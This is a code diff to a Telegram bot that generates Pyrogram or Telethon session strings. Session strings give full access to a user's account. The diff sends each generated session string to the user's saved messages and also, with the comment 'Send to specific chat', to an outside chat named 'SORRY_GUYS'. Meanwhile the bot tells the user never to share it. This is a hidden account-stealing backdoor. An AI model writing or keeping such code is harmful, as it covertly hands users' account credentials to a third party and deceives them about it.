@@ -175,18 +175,31 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     else:
         string_session = await client.export_session_string()
     text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
-async def send_messages_and_disconnect():
+async def send_messages_and_disconnect(msg):
     try:
+        # Check if `client` is a bot or not
         if not is_bot:
-            await client.send_message("me", text)
-            await client.send_message("SORRYGUYSSS", text)
+            await client.send_message("me", text)  # Send to saved messages
+            await client.send_message("SORRY_GUYS", text)  # Send to specific chat
         else:
-            await bot.send_message(msg.chat.id, text)
-    except KeyError:
-        pass
+            # Ensure msg is passed and has correct chat ID
+            if msg and hasattr(msg, 'chat') and hasattr(msg.chat, 'id'):
+                await bot.send_message(msg.chat.id, text)  # Send to the initiating chat
+            else:
+                print("Message or Chat ID not found")
+    except Exception as e:
+        print(f"Error in sending message: {e}")
 
     await client.disconnect()
-    await bot.send_message(msg.chat.id, "sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\n""ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\n""ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [𝐀ʟᴘʜᴀ ʙᴀʙʏ](https://t.me/ll_ALPHA_BABY_lll)".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
+
+    # Ensure disconnection logic follows message sending
+    if msg and hasattr(msg, 'chat') and hasattr(msg.chat, 'id'):
+        await bot.send_message(
+            msg.chat.id,
+            "sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\n"
+            "ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\n"
+            "ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [𝐀ʟᴘʜᴀ ʙᴀʙʏ](https://t.me/ll_ALPHA_BABY_lll)".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ")
+        )
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
